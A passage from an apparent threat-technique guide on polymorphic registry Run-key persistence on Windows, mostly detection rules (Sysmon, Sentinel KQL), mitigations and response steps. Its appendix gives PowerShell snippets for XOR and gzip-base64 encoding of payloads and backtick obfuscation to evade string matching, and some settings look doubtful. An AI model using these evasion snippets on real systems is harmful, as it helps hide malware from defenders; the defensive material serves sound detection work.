4. Set to: **Success and Failure**
5. Apply: `auditpol /set /subcategory:"Registry" /success:enable /failure:enable`

**Sysmon Configuration (XML):**

```xml
<RuleGroup name="Registry Run Key Monitoring" groupRelation="or">
    <RegistryEvent onMatch="include">
        <TargetObject condition="contains">CurrentVersion\Run</TargetObject>
        <TargetObject condition="contains">CurrentVersion\RunOnce</TargetObject>
        <TargetObject condition="contains">Winlogon\UserInit</TargetObject>
        <Details condition="contains any">powershell;cmd;wmi;http</Details>
    </RegistryEvent>
</RuleGroup>
```

---

## 9. MICROSOFT SENTINEL DETECTION

**Rule 1: Polymorphic Registry Run Key Creation (Behavioral Anomaly)**

**Rule Configuration:**
- **Required Table:** AuditLogs, SecurityEvent, DeviceRegistryEvents (Defender for Endpoint integration)
- **Required Fields:** OperationName, TargetResources, AADOperationType, RegistryValueName
- **Alert Severity:** High
- **Frequency:** Run every 1 hour
- **Applies To:** All Entra ID versions + on-premises monitoring

**KQL Query:**
```kusto
// Detects polymorphic registry key creation with encoded payloads
DeviceRegistryEvents
| where ActionType == "RegistryValueSet"
| where RegistryKeyPath contains @"Software\Microsoft\Windows\CurrentVersion\Run" 
    or RegistryKeyPath contains @"Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
| where RegistryValueData matches regex @"^[A-Za-z0-9+/]+=*$" // BASE64 pattern
    or RegistryValueData contains "powershell" or RegistryValueData contains "cmd.exe"
    or RegistryValueData matches regex @"\\x[0-9a-fA-F]{2}" // Hex encoding pattern
| where RegistryValueName !in ("*Update*", "*Windows*", "Windows Update", "SecurityHealth")
| summarize RegistryCount=count(), UniqueDevices=dcount(DeviceId) by RegistryKeyPath, RegistryValueName, RegistryValueData
| where RegistryCount >= 1 and UniqueDevices >= 1
```

**What This Detects:**
- Registry keys created with randomized names (polymorphic naming)
- BASE64-encoded registry values (obfuscation indicator)
- Hex-encoded or escaped character sequences in registry data
- Unusual registry locations (not standard Windows paths)

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Polymorphic Registry Persistence Detection`
   - Severity: `High`
   - Description: `Detects polymorphic registry key creation with obfuscated payloads`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `1 hour`
   - Lookup data from the last: `1 day`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Grouping: By entity (DeviceId, RegistryValueName)
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**

```powershell
# Install Sentinel PowerShell module
Install-Module -Name Az.SecurityInsights -Force

# Connect to Sentinel
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

# Create the analytics rule
$rule = @{
    DisplayName = "Polymorphic Registry Persistence Detection"
    Query = @"
DeviceRegistryEvents
| where ActionType == "RegistryValueSet"
| where RegistryKeyPath contains @"Software\Microsoft\Windows\CurrentVersion\Run"
| where RegistryValueData matches regex @"^[A-Za-z0-9+/]+=*$"
| summarize by RegistryKeyPath, RegistryValueName, RegistryValueData
"@
    Severity = "High"
    Enabled = $true
    QueryFrequency = "PT1H"
    QueryPeriod = "P1D"
}

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName @rule
```

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Enable Enhanced Registry Monitoring via Sysmon**

Implement Sysmon with a focused rule set to detect registry modifications in real-time.

**Applies To Versions:** Server 2016-2025, Windows 10/11

**Manual Steps (Deployment via Group Policy):**

1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a Sysmon configuration file (`sysmon-config.xml`):
   ```xml
   <Sysmon schemaversion="4.20">
     <RuleGroup name="Registry Monitoring" groupRelation="or">
       <RegistryEvent onMatch="include">
         <TargetObject condition="contains">CurrentVersion\Run</TargetObject>
         <Image condition="excludes">explorer.exe;svchost.exe</Image>
       </RegistryEvent>
     </RuleGroup>
   </Sysmon>
   ```
3. Deploy via Group Policy:
   - Create GPO: **Computer Configuration** → **Preferences** → **Windows Settings** → **Files**
   - Copy sysmon64.exe and sysmon-config.xml to `C:\Windows\System32\`
   - Create startup script: `sysmon64.exe -accepteula -i C:\Windows\System32\sysmon-config.xml`
4. Verify installation: `Get-Service Sysmon64` (should show Running)
5. Monitor logs: **Event Viewer** → **Applications and Services Logs** → **Microsoft-Windows-Sysmon** → **Operational**

**Validation Command:**
```powershell
# Verify Sysmon is monitoring registry changes
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterXPath "*[System[EventID=13]]" -MaxEvents 5

# Expected output: Recent registry modification events (EventID 13)
```

**2. Disable Unnecessary Registry Keys (Defense in Depth)**

Disable or remove registry keys that are not required for business operations.

**Applies To Versions:** Server 2016-2025 (with caution)

**Manual Steps (PowerShell):**

```powershell
# Identify and remove suspicious registry Run keys
$runPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$allowedValues = @("OneDrive", "Skype", "Adobe")  # Whitelist known-good values

Get-ItemProperty -Path $runPath | ForEach-Object {
    $_.PSObject.Properties | Where-Object { $_.Name -notin @("PSPath", "PSParentPath", "PSChildName", "PSDrive", "PSProvider") } | ForEach-Object {
        if ($_.Name -notin $allowedValues) {
            Write-Host "[!] Suspicious registry value: $($_.Name) = $($_.Value)"
            # Uncomment to remove: Remove-ItemProperty -Path $runPath -Name $_.Name -Force
        }
    }
}
```

**Manual Steps (Group Policy):**

1. Open **gpmc.msc** on a domain controller
2. Create a new GPO: **Computer Configuration** → **Administrative Templates** → **System** → **Run Startup Scripts**
3. Add a startup script that removes non-whitelisted Run keys
4. Deploy via GPO: `gpupdate /force`

**Validation Command:**
```powershell
# Verify only whitelisted registry values exist
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-Object -ExcludeProperty PSPath*, PS* | Measure-Object | Select-Object -ExpandProperty Count
# Should show minimal entries (ideally < 5)
```

### Priority 2: HIGH

**3. Implement Behavioral Registry Monitoring (EDR/NGAV)**

Deploy endpoint detection and response (EDR) solutions that monitor registry behavior in real-time.

**Manual Steps (Microsoft Defender for Endpoint):**

1. Navigate to **Microsoft Defender Security Center** (security.microsoft.com)
2. Go to **Settings** → **Endpoints** → **Advanced Features**
3. Enable:
   - **Audit registry event** (captures registry changes)
   - **Restrict PowerShell execution history** (prevents obfuscated script discovery)
4. Go to **Threat and Vulnerability Management** → **Configuration Baseline**
5. Configure detection rules for:
   - BASE64-encoded registry values
   - Unusual registry value names (random strings, GUIDs)
   - Registry modifications outside business hours
6. Test: Attempt to modify a registry Run key; Defender should alert

**Validation Command:**
```powershell
# Check Defender threat/vulnerability detection status
Get-MpPreference | Select-Object -Property DisableRealtimeMonitoring, DisableBehaviorMonitoring
# Should show: False, False (both enabled)
```

**4. Enforce Code Signing Requirements**

Require that only signed executables can be launched via registry Run keys (Device Guard / Windows Defender Application Control).

**Manual Steps (Server 2022+):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Administrative Templates** → **System** → **Device Guard** → **Turn On Code Integrity**
3. Set to: **Enabled**
4. Enforcement level: **Enforce**
5. Deploy: `gpupdate /force`
6. Restart systems

**Validation Command:**
```powershell
# Verify Device Guard is enabled
Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object -ExpandProperty Version
# Should show Windows 10/11/Server with Device Guard capable CPU

Get-MpPreference | Select-Object -Property SignatureVersion, DisableRealtimeMonitoring
```

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Registry Keys:** HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\[Random String/GUID]; HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\[Encoded Value]
- **Registry Values:** BASE64-encoded commands, hex-escaped strings, external URLs (http/https), PowerShell invocation patterns
- **Processes:** powershell.exe, cmd.exe, wmi.exe spawned at logon time with unusual parent processes
- **Network:** DNS queries to attacker-controlled domains (if payload downloads from network)

### Forensic Artifacts

- **Disk:** Registry hive files (NTUSER.DAT, SAM, SECURITY) in `C:\Users\[Username]\AppData\Local\Temp\` or `C:\Windows\System32\config\`
- **Memory:** Encoded strings matching BASE64 patterns; URL references in memory dumps
- **Registry:** Last write times on modified Run keys (use `reg query ... /s` with timestamp inspection)
- **Event Logs:** Event ID 4657 (Registry value modified), Event ID 4688 (Process created at logon)

### Response Procedures

1. **Isolate:**
   ```powershell
   # Disconnect network interface
   Disable-NetAdapter -Name "Ethernet" -Confirm:$false
   
   # OR disconnect RDP/remote access
   taskkill /IM svchost.exe /F  # (Careful: this is extreme and may break connectivity)
   ```

2. **Collect Evidence:**
   ```powershell
   # Export registry hive
   reg export "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" C:\Evidence\Run_keys.reg
   
   # Export event logs
   wevtutil epl Security C:\Evidence\Security.evtx
   wevtutil epl System C:\Evidence\System.evtx
   ```

3. **Remediate:**
   ```powershell
   # Remove malicious registry key
   Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "[PolyKey]" -Force
   
   # Scan with antivirus
   & "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType FullScan -Force
   ```

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [REALWORLD-001] BAV2ROPC Attack Chain | Attacker gains initial credential compromise via legacy auth protocol abuse |
| **2** | **Persistence** | **[REALWORLD-029]** Registry Run Key Polymorphism | Attacker establishes polymorphic registry persistence to survive reboots |
| **3** | **Defense Evasion** | [T1112 Modify Registry] + [T1027.001 Polymorphic Code] | Malware obfuscates registry values and uses random key names to evade detection |
| **4** | **Privilege Escalation** | [T1134.005 Access Token Manipulation] | Malware escalates to SYSTEM via token impersonation or UAC bypass |
| **5** | **Impact** | [T1537 Data Transfer to External Locations] | Attacker exfiltrates sensitive data via the polymorphic malware payload |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: Dragonfly APT (2018-2020)
- **Target:** Energy sector (utilities, industrial control systems)
- **Timeline:** 2018-2020 campaigns
- **Technique Status:** ACTIVE – Dragonfly continues to use polymorphic registry persistence with randomized key names mimicking system processes ("NTDLL", "DLL32", etc.)
- **Impact:** Installed backdoor malware that persisted across reboots; enabled lateral movement to critical infrastructure
- **Reference:** [Dragoon's Tale: Dragonfly Use of Registry Persistence - Insane Cyber](https://insanecyber.com/run-key-persistence-threat-hunting-guide/)

### Example 2: Emotet Botnet Variants (2021-2024)
- **Target:** Banking sector, supply chain partners, enterprises
- **Timeline:** 2021 resurgence through 2024
- **Technique Status:** ACTIVE – Emotet variants employ BASE64-encoded registry values with random key naming to evade EDR detection
- **Impact:** Registry persistence maintained malware presence across security updates; enabled credential theft and ransomware deployment
- **Reference:** [Emotet Registry Persistence Analysis - Malwarebytes Labs](https://www.malwarebytes.com/)

---

## APPENDIX: Advanced Evasion Techniques

### Polymorphic Encoding Variants

1. **XOR Encoding with Random Key:**
   ```powershell
   $key = Get-Random -Minimum 0 -Maximum 255
   $payload = "malicious_command"
   $xorEncoded = -join ($payload.ToCharArray() | ForEach-Object { "{0:X2}" -f ([int][char]$_ -bxor $key) })
   # Store $xorEncoded in registry; decode at runtime with same $key
   ```

2. **Gzip Compression + BASE64:**
   ```powershell
   [System.Reflection.Assembly]::LoadWithPartialName("System.IO.Compression.GZipStream") | Out-Null
   $compressedPayload = New-Object IO.MemoryStream
   $gzipStream = New-Object System.IO.Compression.GZipStream($compressedPayload, "Compress")
   $gzipStream.Write([System.Text.Encoding]::Unicode.GetBytes($payload), 0, $payload.Length)
   $gzipStream.Flush()
   $gzipStream.Dispose()
   $base64Compressed = [Convert]::ToBase64String($compressedPayload.ToArray())
   # Store in registry; decompress at runtime
   ```

3. **Format String Obfuscation:**
   ```powershell
   # Instead of: "powershell.exe -Command ..."
   # Use: "po`wer`shell.exe -Com`mand ..."
   # Backticks are ignored by PowerShell parser but defeat simple string matching
   ```

---